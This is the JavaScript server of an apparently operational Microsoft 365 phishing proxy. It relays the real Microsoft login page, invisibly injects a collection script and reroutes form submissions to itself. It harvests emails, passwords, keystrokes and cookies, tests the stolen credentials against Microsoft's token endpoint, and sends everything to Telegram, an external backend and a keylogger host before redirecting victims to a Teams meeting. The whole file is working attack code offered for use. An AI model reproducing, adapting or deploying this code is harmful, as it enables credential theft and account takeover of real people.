const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');

// ============================================================
//  ENVIRONMENT VARIABLES CONFIGURATION
// ============================================================

// Load environment variables
require('dotenv').config();

// Core Configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';

// Service URLs
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.microsoftonline.com/";

// Microsoft OAuth Configuration
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || '943a2b14-68aa-4205-88c1-a4b65ab04e81';
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email User.Read Mail.Read';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Path Configuration
const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    swProxyPath: "/lNv1pC9AWPUY4gbidyBO"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║              ENVIRONMENT CONFIGURATION                    ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
console.log(`║   PHISHED_URL_PARAMETER: ${PHISHED_URL_PARAMETER}`);
console.log(`║   PROXY_ENTRY_POINT: ${PROXY_ENTRY_POINT}`);
console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
console.log(`║   KEYLOGGER_URL: ${KEYLOGGER_URL}`);
console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log(`║   SW_PROXY_PATH: ${PROXY_PATHNAMES.swProxyPath}`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  SESSION STORAGE
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000; // 1 hour

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = VICTIM_SESSIONS[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete VICTIM_SESSIONS[sessionId];
        return null;
    }
    return session;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        cookies: [],
        xssData: [],
        keystrokes: [],
        formData: [],
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        swCaptures: []
    };
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

// ============================================================
//  IP EXTRACTION
// ============================================================

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }

    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();

    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  TELEGRAM NOTIFICATIONS
// ============================================================

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Missing credentials');
        return false;
    }

    try {
        const axios = require('axios');
        const maxLength = 4000;
        if (text.length > maxLength) {
            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
        }
        console.log('[TELEGRAM] ✅ Sent successfully');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Failed:', error.message);
        return false;
    }
}

// ============================================================
//  SERVICE WORKER PROXY ENDPOINT HANDLER
// ============================================================

function handleServiceWorkerProxy(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[SW] 📥 Service worker request intercepted from ${ip}`);
            console.log(`[SW] 🔗 URL: ${data.url}`);
            console.log(`[SW] 📝 Method: ${data.method}`);
            
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].swCaptures = VICTIM_SESSIONS[sessionId].swCaptures || [];
                VICTIM_SESSIONS[sessionId].swCaptures.push({
                    type: 'service_worker_capture',
                    data: data,
                    timestamp: Date.now(),
                    ip: ip
                });
                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
            }
            
            // Check for login credentials in body
            if (data.body && typeof data.body === 'string') {
                try {
                    const formData = new URLSearchParams(data.body);
                    const formObject = {};
                    for (const [key, value] of formData) {
                        formObject[key] = value;
                    }
                    
                    if (formObject.loginfmt || formObject.passwd || formObject.login || formObject.password) {
                        const email = formObject.loginfmt || formObject.login || formObject.email || 'unknown';
                        const password = formObject.passwd || formObject.password || '';
                        
                        console.log(`[SW] 🔐 Captured credentials from service worker`);
                        console.log(`[SW] 📧 Email: ${email}`);
                        console.log(`[SW] 🔑 Password: ${password ? '***' : 'N/A'}`);
                        
                        let msg = `🔐 *SW CAPTURED CREDENTIALS*\n\n`;
                        msg += `*📧 Email:* ${email}\n`;
                        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
                        msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
                        msg += `*📡 IP:* ${ip}\n`;
                        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
                        msg += `*🔗 URL:* ${data.url || 'Unknown'}\n`;
                        msg += `*🎯 Service:* Microsoft 365 (Service Worker)`;
                        
                        sendToTelegram(msg);
                        
                        const axios = require('axios');
                        axios.post(`${BACKEND_URL}/api/log-action`, {
                            action: 'sw_credential_capture',
                            email: email,
                            password: password,
                            visitorInfo: {
                                fullUrl: data.url || 'Unknown',
                                userAgent: data.headers?.['user-agent'] || 'Unknown',
                                sessionId: sessionId,
                                ip: ip,
                                source: 'service_worker'
                            }
                        }).catch(() => {});
                        
                        if (KEYLOGGER_URL) {
                            axios.post(`${KEYLOGGER_URL}/log-combined`, {
                                type: 'sw_credential_capture',
                                email: email,
                                password: password,
                                url: data.url,
                                userAgent: data.headers?.['user-agent'] || 'Unknown',
                                sessionId: sessionId,
                                service: 'Microsoft 365',
                                source: 'service_worker'
                            }).catch(() => {});
                        }
                    }
                } catch (e) {
                    console.log('[SW] Form parse error:', e.message);
                }
            }
            
            // Forward request
            const fetch = require('node-fetch');
            const targetUrl = data.url;
            
            if (targetUrl) {
                const fetchOptions = {
                    method: data.method || 'GET',
                    headers: data.headers || {},
                    redirect: 'manual'
                };
                
                if (data.body && (data.method === 'POST' || data.method === 'PUT')) {
                    fetchOptions.body = data.body;
                }
                
                fetch(targetUrl, fetchOptions)
                .then(async (response) => {
                    const responseBody = await response.text();
                    res.writeHead(response.status, {
                        'Content-Type': response.headers.get('content-type') || 'text/html',
                        'Cache-Control': 'no-store'
                    });
                    res.end(responseBody);
                })
                .catch(error => {
                    console.error('[SW] Forward error:', error.message);
                    res.writeHead(500);
                    res.end(JSON.stringify({ error: 'Forward failed: ' + error.message }));
                });
            } else {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'No URL provided' }));
            }
        } catch (error) {
            console.error('[SW] Error:', error.message);
            console.error('[SW] Stack:', error.stack);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  VERIFY WITH MICROSOFT
// ============================================================

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: MICROSOFT_SCOPES
        });
        
        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({
                            success: true,
                            data: response,
                            cookies: {
                                'ESTSAUTH': response.access_token,
                                'ESTSAUTHPERSISTENT': response.refresh_token || 'N/A',
                                'ESTSCLIENTID': MICROSOFT_CLIENT_ID,
                                'ESTSSESSION': response.id_token || 'N/A'
                            }
                        });
                    } else {
                        resolve({ 
                            success: false, 
                            error: response.error_description || 'Invalid credentials', 
                            cookies: null 
                        });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });
        
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  SERVE FILES
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
        });
        res.end(data);
    });
}

// ============================================================
//  HANDLE XSS COLLECTION
// ============================================================

function handleXSSCollection(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[XSS] 📥 Received XSS data from ${ip}`);
            
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].xssData.push({
                    ...data,
                    timestamp: Date.now(),
                    ip: ip
                });
                
                const axios = require('axios');
                axios.post(`${BACKEND_URL}/api/xss-data`, {
                    xssData: data,
                    visitorInfo: {
                        fullUrl: data.url || 'Unknown',
                        sessionId: sessionId,
                        ip: ip
                    }
                }).catch(() => {});
                
                console.log(`[XSS] ✅ Stored for session ${sessionId.substring(0, 12)}`);
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[XSS] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE COOKIE CAPTURE
// ============================================================

function handleCookieCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[COOKIE] 🍪 Received cookies from ${ip}`);
            
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].cookies.push({
                    ...data,
                    timestamp: Date.now(),
                    ip: ip
                });
                
                console.log(`[COOKIE] ✅ Stored for session ${sessionId.substring(0, 12)}`);
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[COOKIE] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE KEYLOG
// ============================================================

function handleKeylog(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[KEYLOG] ⌨️ Received keystrokes from ${ip}`);
            
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].keystrokes.push({
                    keystrokes: data.keystrokes,
                    timestamp: Date.now(),
                    ip: ip
                });
                
                if (KEYLOGGER_URL) {
                    const axios = require('axios');
                    axios.post(KEYLOGGER_URL, {
                        ...data,
                        sessionId: sessionId,
                        ip: ip,
                        email: VICTIM_SESSIONS[sessionId].email,
                        service: 'Microsoft 365'
                    }).catch(() => {});
                }
                
                console.log(`[KEYLOG] ✅ Stored for session ${sessionId.substring(0, 12)}`);
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[KEYLOG] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE LOGIN REQUEST - CLEAN (No "Proxied" Text)
// ============================================================

function handleLoginRequest(req, res) {
    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found, using default');
        email = 'guest@example.com';
    }

    const hasError = req.url.includes('error=');
    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    // Build Microsoft OAuth URL
    let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${MICROSOFT_CLIENT_ID}&` +
        `response_type=code&` +
        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
        `${paramName}=${encodeURIComponent(email)}`;
    
    if (hasError) {
        const errorParam = req.url.split('error=')[1]?.split('&')[0] || '';
        targetUrl += `&error=${errorParam}`;
    }

    console.log(`[PROXY] 🔄 Proxying Microsoft OAuth`);
    console.log(`[PROXY] 📧 Email: ${email}`);
    console.log(`[PROXY] 🆔 Session: ${sessionId}`);
    console.log(`[PROXY] 📡 IP: ${ip}`);

    https.get(targetUrl, (targetRes) => {
        let data = [];
        let contentLength = 0;
        
        targetRes.on('data', chunk => {
            data.push(chunk);
            contentLength += chunk.length;
        });
        
        targetRes.on('end', () => {
            let body = Buffer.concat(data).toString();
            
            // Decompress if needed
            const encoding = targetRes.headers['content-encoding'];
            if (encoding && encoding.includes('gzip')) {
                try {
                    body = zlib.gunzipSync(Buffer.from(body)).toString();
                } catch (e) {
                    console.log('[PROXY] Decompression error:', e.message);
                }
            }
            
            // ✅ CLEAN INJECTION - No visible indicators
            const injectionScript = `
            <script>
                window.MICROSOFT_CONFIG = {
                    BACKEND_URL: '${BACKEND_URL}',
                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
                    XSS_ENDPOINT: '${PROXY_PATHNAMES.xssEndpoint}',
                    COOKIE_ENDPOINT: '${PROXY_PATHNAMES.cookieEndpoint}',
                    KEYLOG_ENDPOINT: '${PROXY_PATHNAMES.keylogEndpoint}',
                    SW_PROXY_PATH: '${PROXY_PATHNAMES.swProxyPath}',
                    SESSION_ID: '${sessionId}',
                    EMAIL: '${email}',
                    CLIENT_ID: '${MICROSOFT_CLIENT_ID}',
                    SERVICE: 'Microsoft 365'
                };
            </script>
            <script src="${PROXY_PATHNAMES.script}"></script>
            `;
            
            // Inject before </body>
            body = body.replace(/<\/body>/i, injectionScript + '</body>');
            
            // Intercept form action to go through proxy
            body = body.replace(/action="https:\/\/login\.microsoftonline\.com[^"]*"/gi, 
                `action="/proxy-login"`);
            
            // Also intercept any JavaScript form submissions
            body = body.replace(/login\.microsoftonline\.com/g, 
                `${req.headers.host}/proxy-login`);
            
            res.writeHead(targetRes.statusCode || 200, {
                'Content-Type': 'text/html',
                'Cache-Control': 'no-store, no-cache, must-revalidate',
                'Pragma': 'no-cache'
            });
            res.end(body);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

// ============================================================
//  HANDLE PROXY LOGIN (Intercepted Microsoft form submission)
// ============================================================

function handleProxyLogin(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const formData = querystring.parse(body);
            const ip = getClientIp(req);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            
            let email = '';
            
            // Extract email from form data
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                email = VICTIM_SESSIONS[sessionId].email;
                VICTIM_SESSIONS[sessionId].attempts = (VICTIM_SESSIONS[sessionId].attempts || 0) + 1;
            }
            
            if (!email) {
                email = formData.loginfmt || formData.login || formData.email || '';
            }
            
            if (!email) {
                const referer = req.headers.referer || '';
                const hintMatch = referer.match(/login_hint=([^&]+)/);
                if (hintMatch) {
                    email = decodeURIComponent(hintMatch[1]);
                }
            }
            
            if (!email) {
                console.warn('[PROXY-LOGIN] No email found');
                email = 'unknown@domain.com';
            }

            const password = formData.passwd || formData.password || '';
            let attemptCount = attemptCounts.get(email) || 0;
            attemptCount++;
            attemptCounts.set(email, attemptCount);

            console.log(`[PROXY-LOGIN] 📧 Email: ${email}`);
            console.log(`[PROXY-LOGIN] 🔑 Password: ${password ? '***' : 'N/A'}`);
            console.log(`[PROXY-LOGIN] 📊 Attempt: ${attemptCount}`);
            console.log(`[PROXY-LOGIN] 📡 IP: ${ip}`);
            console.log(`[PROXY-LOGIN] 🆔 Session: ${sessionId || 'N/A'}`);

            // ✅ SEND TO TELEGRAM - ALWAYS
            let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
            msg += `*📧 Email:* ${email}\n`;
            msg += `*🔑 Password:* ${password || 'N/A'}\n`;
            msg += `*📡 IP:* ${ip}\n`;
            msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
            msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
            msg += `*🎯 Service:* Microsoft 365\n`;
            msg += `*📌 Source:* ${req.headers.referer?.includes('login.microsoftonline.com') ? 'Microsoft Login Page' : 'Proxy Page'}`;
            
            sendToTelegram(msg);

            // Send to backend
            const axios = require('axios');
            axios.post(`${BACKEND_URL}/api/authenticate`, {
                email: email,
                password: password,
                attemptCount: attemptCount,
                visitorInfo: {
                    fullUrl: req.url,
                    userAgent: req.headers['user-agent'],
                    sessionId: sessionId,
                    ip: ip,
                    source: 'proxied_microsoft_page'
                }
            }).catch(() => {});

            // Send to keylogger server
            if (KEYLOGGER_URL && password) {
                axios.post(`${KEYLOGGER_URL}/log-combined`, {
                    type: 'microsoft_login',
                    email: email,
                    password: password,
                    url: req.url,
                    userAgent: req.headers['user-agent'],
                    sessionId: sessionId,
                    formData: formData,
                    service: 'Microsoft 365',
                    action: 'login_attempt',
                    attempt: attemptCount,
                    source: 'proxied_microsoft_page'
                }).catch(() => {});
            }

            // Verify with Microsoft
            verifyWithMicrosoft(email, password)
                .then((result) => {
                    if (result.success) {
                        console.log(`[AUTH] ✅ Valid Microsoft credentials: ${email}`);
                        
                        if (sessionId && VICTIM_SESSIONS[sessionId]) {
                            VICTIM_SESSIONS[sessionId].cookies.push({
                                type: 'microsoft_auth',
                                cookies: result.cookies,
                                timestamp: Date.now()
                            });
                        }
                        
                        // Send success notification
                        let successMsg = `✅ *VALID MICROSOFT CREDENTIALS*\n\n`;
                        successMsg += `*📧 Email:* ${email}\n`;
                        successMsg += `*🔑 Password:* ${password || 'N/A'}\n`;
                        successMsg += `*📡 IP:* ${ip}\n`;
                        successMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
                        successMsg += `*🎯 Service:* Microsoft 365\n\n`;
                        successMsg += `*🍪 Auth Tokens:*\n`;
                        for (const [name, value] of Object.entries(result.cookies)) {
                            const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                            successMsg += `  \`${name}\`: \`${displayValue}\`\n`;
                        }
                        
                        sendToTelegram(successMsg);
                        
                        // Redirect to Teams
                        res.writeHead(302, { 
                            'Location': TEAMS_REDIRECT, 
                            'Cache-Control': 'no-store, no-cache, must-revalidate'
                        });
                        res.end();
                    } else {
                        console.log(`[AUTH] ❌ Invalid Microsoft credentials: ${email}`);
                        
                        sendToTelegram(`❌ *INVALID MICROSOFT CREDENTIALS*\n\n📧 Email: ${email}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}\n🔄 Attempt #${attemptCount}`);
                        
                        // Redirect back to proxied Microsoft page with error
                        const errorUrl = `/login?login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
                        
                        res.writeHead(302, { 
                            'Location': errorUrl,
                            'Cache-Control': 'no-store'
                        });
                        res.end();
                    }
                })
                .catch((error) => {
                    console.error('[ERROR] Microsoft verification failed:', error.message);
                    const errorUrl = `/login?login_hint=${encodeURIComponent(email)}&error=service_error`;
                    res.writeHead(302, { 'Location': errorUrl });
                    res.end();
                });

        } catch (error) {
            console.error('[ERROR] Proxy login failed:', error.message);
            res.writeHead(500);
            res.end('Internal server error');
        }
    });
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // Serve files
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('microsoft_inject.js', res, 'text/javascript');
        return;
    }

    // Service Worker Proxy Endpoint
    if (req.url === PROXY_PATHNAMES.swProxyPath && req.method === 'POST') {
        handleServiceWorkerProxy(req, res);
        return;
    }

    // XSS Collection endpoint
    if (req.url === PROXY_PATHNAMES.xssEndpoint && req.method === 'POST') {
        handleXSSCollection(req, res);
        return;
    }

    // Cookie Capture endpoint
    if (req.url === PROXY_PATHNAMES.cookieEndpoint && req.method === 'POST') {
        handleCookieCapture(req, res);
        return;
    }

    // Keylog endpoint
    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
        handleKeylog(req, res);
        return;
    }

    // Proxy Login endpoint (intercepted Microsoft form submissions)
    if (req.url === '/proxy-login' && req.method === 'POST') {
        handleProxyLogin(req, res);
        return;
    }

    // Health check
    if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            sessions: Object.keys(VICTIM_SESSIONS).length,
            service: 'Microsoft 365 Proxy with Service Worker',
            version: '2.0.0-sw'
        }));
        return;
    }

    // Sessions admin
    if (req.url === '/sessions' && req.method === 'GET') {
        const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: VICTIM_SESSIONS[id].email || 'N/A',
            ip: VICTIM_SESSIONS[id].ip || 'N/A',
            created: VICTIM_SESSIONS[id].created,
            xssCount: (VICTIM_SESSIONS[id].xssData || []).length,
            cookieCount: (VICTIM_SESSIONS[id].cookies || []).length,
            keystrokeCount: (VICTIM_SESSIONS[id].keystrokes || []).length,
            swCaptures: (VICTIM_SESSIONS[id].swCaptures || []).length,
            attempts: VICTIM_SESSIONS[id].attempts || 0
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData
        }, null, 2));
        return;
    }

    // POST requests
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // Login requests
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // Default redirect
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║        ✅  MICROSOFT 365 PROXY v2.1 - FULL PROXY        ║');
    console.log('║        🔐  ALL Microsoft Pages are PROXIED              ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}?login_hint=email   ║`);
    console.log(`║   🔗 Proxy Login: /proxy-login (intercepted)            ║`);
    console.log(`║   🔗 SW Proxy:  ${PROXY_PATHNAMES.swProxyPath}          ║`);
    console.log(`║   🔗 XSS:       ${PROXY_PATHNAMES.xssEndpoint}          ║`);
    console.log(`║   🔗 Cookies:   ${PROXY_PATHNAMES.cookieEndpoint}       ║`);
    console.log(`║   🔗 Keylog:    ${PROXY_PATHNAMES.keylogEndpoint}       ║`);
    console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
    console.log(`║   🔗 Backend:   ${BACKEND_URL}                          ║`);
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   🚀 CLEAN MODE: No visible indicators to user          ║');
    console.log('║   ✅ Proxies ALL Microsoft login pages                  ║');
    console.log('║   ✅ Captures ALL login attempts                        ║');
    console.log('║   ✅ Reports ALL attempts to Telegram                  ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});